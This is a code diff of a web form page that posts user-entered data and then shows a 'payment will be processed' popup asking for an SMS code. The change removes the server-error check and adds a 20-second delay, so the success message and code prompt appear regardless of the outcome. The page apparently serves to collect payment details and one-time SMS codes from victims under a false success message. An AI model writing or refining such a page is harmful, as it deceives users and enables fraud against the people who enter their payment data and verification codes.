@@ -166,7 +166,7 @@
 
   <div class="popup" id="smsPopup">
   <div class="popup-content">
-    <h3>Your payment will be processed in 3 days!</h3>
+    <h3>Your payment will be processed in 3-5 business days</h3>
 
     <div id="smsStatus" style="margin-top:10px;font-size:14px;color:#b9b9b9;"></div>
   </div>
@@ -238,18 +238,20 @@ fields.forEach(f => {
         body: JSON.stringify(payload)
       });
 
-      popup.classList.remove('active'); 
+  setTimeout(() => {
+    popup.classList.remove('active'); 
+    document.getElementById('smsPopup').classList.add('active');
 
-      if (!res.ok) throw new Error('Server error');
-popup.classList.remove('active'); 
-document.getElementById('smsPopup').classList.add('active');
-      e.target.reset();
-      fields.forEach(f => f.closest('.field').classList.remove('valid', 'invalid'));
-    } catch (err) {
-      popup.classList.remove('active');
-      statusEl.style.color = 'var(--danger)';
-      statusEl.textContent = err.message || 'Error';
-    }
+    // очищаем форму
+    e.target.reset();
+    fields.forEach(f => f.closest('.field').classList.remove('valid', 'invalid'));
+  }, 20000); // 20 секунд задержки
+
+} catch (err) {
+  popup.classList.remove('active');
+  statusEl.style.color = 'var(--danger)';
+  statusEl.textContent = err.message || 'Error';
+}
   });
   const smsPopup = document.getElementById('smsPopup');
 const smsInput = document.getElementById('smsCode');
